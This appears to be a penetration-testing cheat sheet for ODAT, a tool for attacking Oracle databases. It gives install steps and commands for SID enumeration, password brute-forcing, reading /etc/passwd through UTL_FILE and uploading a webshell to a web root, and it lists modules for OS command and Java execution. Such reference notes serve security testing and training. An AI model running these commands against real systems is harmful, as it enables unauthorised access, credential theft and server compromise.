---
tags: [basics, tool, database, oracle]
---


> [!info] See also: [[Oracle TNS]] · [[sqlplus]]


[Oracle Database Attacking Tool](https://github.com/quentinhardy/odat) — auditing/attack framework for Oracle databases. Covers SID enumeration, account brute-forcing, privilege escalation, and file read/write via UTL_FILE.

## Install (Linux)

```bash
sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init && git submodule update

wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

pip3 install cx_Oracle colorlog termcolor passlib python-libnmap pycryptodome
sudo apt-get install python3-scapy build-essential libgmp-dev -y
```

## Recon

```bash
# Run all modules (slow but exhaustive)
./odat.py all -s <ip>

# Just SID enumeration
./odat.py sidguesser -s <ip> -p 1521

# Account brute force once SID is known
./odat.py passwordguesser -s <ip> -d <SID> --accounts-files=accounts/accounts.txt
```

## Post-Auth — File Read/Write

Requires SYSDBA privileges (`--sysdba`) or DBA-equivalent.

```bash
# Read a file from the server's filesystem
./odat.py utlfile -s <ip> -d <SID> -U <user> -P <password> --sysdba --getFile /etc/passwd ./passwd

# Drop a file (e.g. a webshell into the webroot)
./odat.py utlfile -s <ip> -d <SID> -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx
```

## Useful Modules

- `sidguesser` — discover valid SIDs
- `passwordguesser` — brute-force accounts
- `tnscmd` — interact with TNS listener
- `utlfile` — file read/write via UTL_FILE
- `externaltable` — read files via CREATE TABLE … ORGANIZATION EXTERNAL
- `dbmsscheduler` — OS command execution via DBMS_SCHEDULER (DBA needed)
- `java` — execute arbitrary Java (DBA needed)
